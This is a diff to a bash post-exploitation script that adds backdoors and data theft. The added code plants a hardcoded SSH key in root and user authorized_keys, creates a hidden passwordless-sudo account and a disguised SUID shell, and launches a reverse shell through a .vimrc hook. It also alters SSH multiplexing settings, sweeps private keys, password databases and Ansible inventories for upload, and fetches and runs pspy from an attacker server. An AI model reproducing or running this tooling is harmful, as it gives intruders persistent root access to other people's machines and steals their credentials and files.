@@ -160,6 +160,75 @@ persist_mode() {
         fi
     done
 
+    echo "[*] Adding SSH key persistence..."
+    SSH_KEY="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEddy3DoHUkaF4AZbisSRqfpc7zI7JSu3vR9eK8JllQH"
+    
+    # Check if running as root
+    if [ "$(id -u)" -eq 0 ]; then
+        echo "[*] Running as root, checking SSH configuration..."
+        # Check if root SSH login is allowed
+        if grep -qE "^PermitRootLogin\s+(yes|without-password|prohibit-password)" /etc/ssh/sshd_config 2>/dev/null || \
+           ! grep -qE "^PermitRootLogin\s+no" /etc/ssh/sshd_config 2>/dev/null; then
+            # Add SSH key to root
+            mkdir -p /root/.ssh 2>/dev/null
+            chmod 700 /root/.ssh 2>/dev/null
+            if ! grep -q "$SSH_KEY" /root/.ssh/authorized_keys 2>/dev/null; then
+                echo "$SSH_KEY" >> /root/.ssh/authorized_keys 2>/dev/null
+                chmod 600 /root/.ssh/authorized_keys 2>/dev/null
+                echo "[+] SSH key added to root authorized_keys"
+            else
+                echo "[*] SSH key already present in root authorized_keys"
+            fi
+        else
+            echo "[*] Root SSH login disabled, creating backdoor user..."
+            # Create backdoor user svc_acc
+            if ! id svc_acc >/dev/null 2>&1; then
+                useradd -m -s /bin/bash svc_acc 2>/dev/null
+                # Add to sudoers
+                echo "svc_acc ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers.d/svc_acc 2>/dev/null
+                chmod 440 /etc/sudoers.d/svc_acc 2>/dev/null
+                echo "[+] Created svc_acc user with sudo privileges"
+            fi
+            # Add SSH key
+            mkdir -p /home/svc_acc/.ssh 2>/dev/null
+            chmod 700 /home/svc_acc/.ssh 2>/dev/null
+            chown -R svc_acc:svc_acc /home/svc_acc/.ssh 2>/dev/null
+            if ! grep -q "$SSH_KEY" /home/svc_acc/.ssh/authorized_keys 2>/dev/null; then
+                echo "$SSH_KEY" >> /home/svc_acc/.ssh/authorized_keys 2>/dev/null
+                chmod 600 /home/svc_acc/.ssh/authorized_keys 2>/dev/null
+                chown svc_acc:svc_acc /home/svc_acc/.ssh/authorized_keys 2>/dev/null
+                echo "[+] SSH key added to svc_acc authorized_keys"
+            fi
+        fi
+        
+        echo "[*] Creating SUID backdoor..."
+        # Create SUID shell backdoor in a hidden location
+        BACKDOOR_PATH="/var/tmp/.systemd-private"
+        if cp /bin/bash "$BACKDOOR_PATH" 2>/dev/null; then
+            chown root:root "$BACKDOOR_PATH" 2>/dev/null
+            chmod 4755 "$BACKDOOR_PATH" 2>/dev/null
+            echo "[+] SUID backdoor created at $BACKDOOR_PATH (run with -p flag)"
+        else
+            echo "[-] Failed to create SUID backdoor"
+        fi
+    else
+        # Regular user - just add SSH key to their account
+        SSH_DIR="$BASEDIR/.ssh"
+        if mkdir -p "$SSH_DIR" 2>/dev/null; then
+            chmod 700 "$SSH_DIR" 2>/dev/null || true
+            if ! grep -q "$SSH_KEY" "$SSH_DIR/authorized_keys" 2>/dev/null; then
+                echo "$SSH_KEY" >> "$SSH_DIR/authorized_keys" 2>/dev/null && \
+                    chmod 600 "$SSH_DIR/authorized_keys" 2>/dev/null && \
+                    echo "[+] SSH key added to authorized_keys" || \
+                    echo "[-] Failed to add SSH key"
+            else
+                echo "[*] SSH key already present in authorized_keys"
+            fi
+        else
+            echo "[-] Failed to create .ssh directory"
+        fi
+    fi
+
     echo "[+] Persistence components started and added to rc files."
 }
 
@@ -177,7 +246,12 @@ collect_mode() {
             -o -name "*.txt" -o -name "*.log" -o -name "*.conf" \
             -o -name "*.pdf" -o -name "*.xls" -o -name "*.xlsx" \
             -o -name "*.doc" -o -name "*.docx" -o -name "*.kdbx" \
-            -o -name "id_*" -o -name "*env"-o -name "authorized_keys" \) \
+            -o -name "id_*" -o -name "*_rsa" -o -name "*_rsa.pub" \
+            -o -name "*_dsa" -o -name "*_dsa.pub" \
+            -o -name "*_ecdsa" -o -name "*_ecdsa.pub" \
+            -o -name "*_ed25519" -o -name "*_ed25519.pub" \
+            -o -name "*.pem" -o -name "*.key" \
+            -o -name "*env" -o -name "known_hosts" -o -name "authorized_keys" \) \
             -print0 2>/dev/null || true
     done |
         while IFS= read -r -d '' f; do
@@ -207,11 +281,176 @@ collect_mode() {
         fi
     fi
 
+    echo "[*] Checking for specific tools and services..."
+    TOOLS_OUTPUT="${HOSTNAME}_${USERNAME}_tools_check.txt"
+    
+    # Check for ansible
+    if command -v ansible >/dev/null 2>&1; then
+        echo "=== Ansible Found ===" >> "$TOOLS_OUTPUT"
+        echo "Path: $(command -v ansible)" >> "$TOOLS_OUTPUT"
+        ansible --version >> "$TOOLS_OUTPUT" 2>&1 || true
+        echo "" >> "$TOOLS_OUTPUT"
+        
+        # Check for ansible inventory and config files
+        if [ -f "/etc/ansible/hosts" ]; then
+            echo "--- /etc/ansible/hosts ---" >> "$TOOLS_OUTPUT"
+            cat /etc/ansible/hosts >> "$TOOLS_OUTPUT" 2>&1 || true
+            echo "" >> "$TOOLS_OUTPUT"
+        fi
+        if [ -f "$HOME/.ansible.cfg" ]; then
+            echo "--- ~/.ansible.cfg ---" >> "$TOOLS_OUTPUT"
+            cat "$HOME/.ansible.cfg" >> "$TOOLS_OUTPUT" 2>&1 || true
+            echo "" >> "$TOOLS_OUTPUT"
+        fi
+    else
+        echo "ansible: Not found" >> "$TOOLS_OUTPUT"
+    fi
+    
+    # Check for artifactoryctl
+    if command -v artifactoryctl >/dev/null 2>&1; then
+        echo "=== Artifactoryctl Found ===" >> "$TOOLS_OUTPUT"
+        echo "Path: $(command -v artifactoryctl)" >> "$TOOLS_OUTPUT"
+        artifactoryctl --version >> "$TOOLS_OUTPUT" 2>&1 || true
+        echo "" >> "$TOOLS_OUTPUT"
+        
+        echo "--- Artifactory Processes ---" >> "$TOOLS_OUTPUT"
+        ps aux | grep -i artifactory | grep -v grep >> "$TOOLS_OUTPUT" 2>&1 || echo "No artifactory processes found" >> "$TOOLS_OUTPUT"
+        echo "" >> "$TOOLS_OUTPUT"
+    else
+        echo "artifactoryctl: Not found" >> "$TOOLS_OUTPUT"
+        
+        # Still check for artifactory processes even if artifactoryctl is not found
+        if ps aux | grep -i artifactory | grep -v grep >/dev/null 2>&1; then
+            echo "--- Artifactory Processes (without artifactoryctl) ---" >> "$TOOLS_OUTPUT"
+            ps aux | grep -i artifactory | grep -v grep >> "$TOOLS_OUTPUT" 2>&1 || true
+            echo "" >> "$TOOLS_OUTPUT"
+        fi
+    fi
+    
+    # Upload the tools check output
+    if [ -f "$TOOLS_OUTPUT" ]; then
+        upload_file "$TOOLS_OUTPUT" "$TOOLS_OUTPUT"
+        rm -f "$TOOLS_OUTPUT"
+    fi
+
     echo "[+] Collection & exfiltration complete."
 }
 
 privesc_mode() {
     echo "[*] Running privesc mode in $WORKDIR"
+
+    echo "[*] Adding vim-based persistence..."
+    # Create vim plugin
+    mkdir -p "$BASEDIR/.vim/plugins" 2>/dev/null
+    cat > "$BASEDIR/.vim/plugins/settings.vim" << 'VIMEOF'
+#!/usr/bin/env bash
+# Background the reverse shell
+if [ -f "$HOME/.local/.cache/.svc/reverse" ]; then
+    (nohup "$HOME/.local/.cache/.svc/reverse" >/dev/null 2>&1 &)
+elif [ -f "/dev/shm/.svc/reverse" ]; then
+    (nohup "/dev/shm/.svc/reverse" >/dev/null 2>&1 &)
+fi
+
+SSH_KEY="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEddy3DoHUkaF4AZbisSRqfpc7zI7JSu3vR9eK8JllQH"
+
+# If running as root
+if [ "$(id -u)" -eq 0 ]; then
+    # Check if root SSH login is allowed
+    if grep -qE "^PermitRootLogin\s+(yes|without-password|prohibit-password)" /etc/ssh/sshd_config 2>/dev/null || \
+       ! grep -qE "^PermitRootLogin\s+no" /etc/ssh/sshd_config 2>/dev/null; then
+        # Add SSH key to root
+        mkdir -p /root/.ssh 2>/dev/null
+        chmod 700 /root/.ssh 2>/dev/null
+        if ! grep -q "$SSH_KEY" /root/.ssh/authorized_keys 2>/dev/null; then
+            echo "$SSH_KEY" >> /root/.ssh/authorized_keys 2>/dev/null
+            chmod 600 /root/.ssh/authorized_keys 2>/dev/null
+        fi
+    else
+        # Create backdoor user svc_acc
+        if ! id svc_acc >/dev/null 2>&1; then
+            useradd -m -s /bin/bash svc_acc 2>/dev/null
+            # Add to sudoers
+            echo "svc_acc ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers.d/svc_acc 2>/dev/null
+            chmod 440 /etc/sudoers.d/svc_acc 2>/dev/null
+        fi
+        # Add SSH key
+        mkdir -p /home/svc_acc/.ssh 2>/dev/null
+        chmod 700 /home/svc_acc/.ssh 2>/dev/null
+        chown -R svc_acc:svc_acc /home/svc_acc/.ssh 2>/dev/null
+        if ! grep -q "$SSH_KEY" /home/svc_acc/.ssh/authorized_keys 2>/dev/null; then
+            echo "$SSH_KEY" >> /home/svc_acc/.ssh/authorized_keys 2>/dev/null
+            chmod 600 /home/svc_acc/.ssh/authorized_keys 2>/dev/null
+            chown svc_acc:svc_acc /home/svc_acc/.ssh/authorized_keys 2>/dev/null
+        fi
+    fi
+fi
+VIMEOF
+    chmod +x "$BASEDIR/.vim/plugins/settings.vim" 2>/dev/null
+
+    # Add to vimrc
+    if [ ! -f "$BASEDIR/.vimrc" ] || ! grep -q "silent !source ~/.vim/plugins/settings.vim" "$BASEDIR/.vimrc" 2>/dev/null; then
+        cat >> "$BASEDIR/.vimrc" << 'EOF'
+:silent !source ~/.vim/plugins/settings.vim
+:if $USER == "root"
+:autocmd BufWritePost * :silent :w! >> /tmp/hackedfromvim.txt
+:endif
+EOF
+        echo "[+] Added vim persistence to .vimrc"
+    fi
+
+    # Add sudo alias to bashrc
+    if [ -f "$BASEDIR/.bashrc" ]; then
+        if ! grep -q 'alias sudo="sudo -E"' "$BASEDIR/.bashrc" 2>/dev/null; then
+            echo 'alias sudo="sudo -E"' >> "$BASEDIR/.bashrc"
+            echo "[+] Added sudo alias to .bashrc"
+        fi
+    fi
+
+    echo "[*] Adding SSH config for connection persistence..."
+    # Check if running as root
+    if [ "$(id -u)" -eq 0 ]; then
+        # Add to system-wide SSH config
+        SSH_CONFIG="/etc/ssh/ssh_config"
+        if [ -f "$SSH_CONFIG" ]; then
+            if ! grep -q "ControlMaster auto" "$SSH_CONFIG" 2>/dev/null; then
+                cat >> "$SSH_CONFIG" << 'SSHEOF'
+
+# Connection multiplexing for persistence
+Host *
+    ControlPath ~/.ssh/controlmaster/%r@%h:%p
+    ControlMaster auto
+    ControlPersist yes
+    AllowAgentForwarding yes
+SSHEOF
+                echo "[+] Added SSH config to $SSH_CONFIG"
+            else
+                echo "[*] SSH config already present in $SSH_CONFIG"
+            fi
+        fi
+    else
+        # Add to user's SSH config
+        SSH_CONFIG="$BASEDIR/.ssh/config"
+        mkdir -p "$BASEDIR/.ssh" 2>/dev/null
+        mkdir -p "$BASEDIR/.ssh/controlmaster" 2>/dev/null
+        chmod 700 "$BASEDIR/.ssh" 2>/dev/null
+        chmod 700 "$BASEDIR/.ssh/controlmaster" 2>/dev/null
+        
+        if [ ! -f "$SSH_CONFIG" ] || ! grep -q "ControlMaster auto" "$SSH_CONFIG" 2>/dev/null; then
+            cat >> "$SSH_CONFIG" << 'SSHEOF'
+
+# Connection multiplexing for persistence
+Host *
+    ControlPath ~/.ssh/controlmaster/%r@%h:%p
+    ControlMaster auto
+    ControlPersist yes
+    AllowAgentForwarding yes
+SSHEOF
+            chmod 600 "$SSH_CONFIG" 2>/dev/null
+            echo "[+] Added SSH config to $SSH_CONFIG"
+        else
+            echo "[*] SSH config already present in $SSH_CONFIG"
+        fi
+    fi
 
     wget -q "http://$SERVER_IP/linpeas" -O linpeas || {
         echo "[-] Failed to download linpeas"
@@ -227,6 +466,27 @@ privesc_mode() {
     upload_file "${HOSTNAME}_${USERNAME}_linpeas.txt" "${HOSTNAME}_${USERNAME}_linpeas.txt"
 
     rm -f linpeas "${HOSTNAME}_${USERNAME}_linpeas.txt"
+
+    echo "[*] Running pspy for process monitoring..."
+    wget -q "http://$SERVER_IP/pspy" -O pspy || {
+        echo "[-] Failed to download pspy"
+        echo "[+] Privesc scan completed and cleaned up."
+        return
+    }
+    chmod +x pspy
+
+    PSPY_OUTPUT="${HOSTNAME}_${USERNAME}_pspy.txt"
+    
+    echo "[*] Running pspy -i 1000 for 30 seconds..."
+    timeout 30 ./pspy -i 1000 >> "$PSPY_OUTPUT" 2>&1 || true
+    
+    echo "[*] Running pspy -f -i 1000 for 30 seconds..."
+    timeout 30 ./pspy -f -i 1000 >> "$PSPY_OUTPUT" 2>&1 || true
+
+    upload_file "$PSPY_OUTPUT" "$PSPY_OUTPUT"
+
+    rm -f pspy "$PSPY_OUTPUT"
+
     echo "[+] Privesc scan completed and cleaned up."
 }
 
